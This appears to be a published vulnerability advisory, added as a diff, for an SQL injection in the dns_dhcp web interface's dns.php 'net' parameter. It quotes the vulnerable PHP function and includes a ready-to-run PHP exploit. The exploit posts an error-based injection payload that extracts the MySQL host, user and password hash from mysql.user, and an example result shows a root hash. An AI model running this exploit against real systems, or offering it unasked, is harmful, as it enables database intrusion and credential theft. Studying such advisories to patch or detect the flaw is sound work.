@@ -1,0 +1,150 @@
+/*
+[+] Credits: hyp3rlinx
+[+] Website: hyp3rlinx.altervista.org
+[+] Source: http://hyp3rlinx.altervista.org/advisories/DNS_DHCP-WEB-INTERFACE-SQL-INJECTION.txt
+[+] ISR: apparitionsec
+
+Vendor:
+====================
+tmcdos / sourceforge
+
+Product:
+======================
+dns_dhcp Web Interface
+
+Download: sourceforge.net/projects/dnsmasq-mikrotik-admin/?source=directory
+
+This is a very simple web interface for management of static DHCP leases in
+DNSmasq and Mikrotik.
+It generates config files for DNSmasq and uses RouterOS API to manage
+Mikrotik. Network devices (usually PCs)
+are separated into subnets by department and use triplets (hostname, MAC
+address, IP address) for identification.
+Information is stored in MySQL.
+
+Vulnerability Type:
+===================
+SQL Injection
+
+CVE Reference:
+==============
+N/A
+
+Vulnerability Details:
+=====================
+
+The 'net' HTTP form POST parameter to dns.php script is not
+checked/santized and is used directly in MySQL query allowing
+attacker to easily exfiltrate any data from the backend database by using
+SQL Injection exploits.
+
+1) On line 239 of dns.php
+$b = str_replace('{FIRMA}',a_select('SUBNET',$_REQUEST['net']),$b);
+
+2)
+dns.php line 187 the a_select function where 2nd argument $_REQUEST['net']
+is passed to an concatenated to query ($clause)
+and executed on line 194 mysql_query($query).
+
+function a_select($tbl,$clause,$field='',$where='')
+{
+if ($clause==0) return '&#160;';
+if($field=='') $field=$tbl;
+$query = "SELECT $field FROM $tbl WHERE ";
+if($where=='') $query.='ID='.$clause;
+else $query.=$where;
+$res = mysql_query($query) or
+trigger_error($query.'<br>'.mysql_error(),E_USER_ERROR);
+if(mysql_num_rows($res)>0) return mysql_result($res,0,0);
+else return '&#160;';
+}
+
+Exploit code(s):
+===============
+
+Run from CL...
+*/
+
+<?php
+#dns_dhcp SQL Injection Exploit
+#exfiltrates host, user and password from MySQL
+#by hyp3rlinx
+#ISR - apparitionsec
+#hyp3rlinx.altervista.org
+#========================
+
+
+$victim="localhost";
+$url="/dns_dhcp/dns/dns.php";
+$port=80;
+$r='';
+
+$s = fsockopen($victim, $port, $errno, $errstr, 30);
+if(!$s){echo "Cant connect to the fucking server!"; exit();}
+
+$sql="net=1 and (select 1 from(select count(*),concat((select (select
+concat(0x2b,host,0x2b,user,0x2b,password,0x2b)) from mysql.user limit
+1),floor(rand(0)*2))x from mysql.user group by x)a)";
+
+    $out = "POST $url HTTP/1.1\r\n";
+    $out .= "Host: $victim\r\n";
+    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
+    $out .= 'Content-Length: ' . strlen($sql) . "\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($s, $out);
+    fwrite($s, $sql);
+    while (!feof($s)) {
+        $r .= fgets($s, 128);
+if(strpos($r,'Duplicate entry')!==FALSE){
+$idx=strpos($r,'Duplicate entry');
+echo substr($r,$idx);
+break;
+}
+    }
+    fclose($s);
+/*
+Example result:
+Duplicate entry
+'+localhost+root+*6691484EA6B50DDDE1926A220DA01FA9E575C18A+1' for key
+'group_key'
+*/
+?>
+
+/*
+Disclosure Timeline:
+===============================
+Vendor Notification:  NA
+May 14, 2016 : Public Disclosure
+
+Exploitation Technique:
+=======================
+Remote
+
+Severity Level:
+================
+High
+
+Description:
+==================================================
+Request Method(s):        [+] POST
+
+Vulnerable Product:       [+] dns_dhcp Web Interface
+
+Vulnerable Parameter(s):  [+] 'net'
+=====================================================
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no
+warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the
+information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author
+prohibits any malicious use of security related information
+or exploits by the author or elsewhere.
+
+hyp3rlinx
+*/
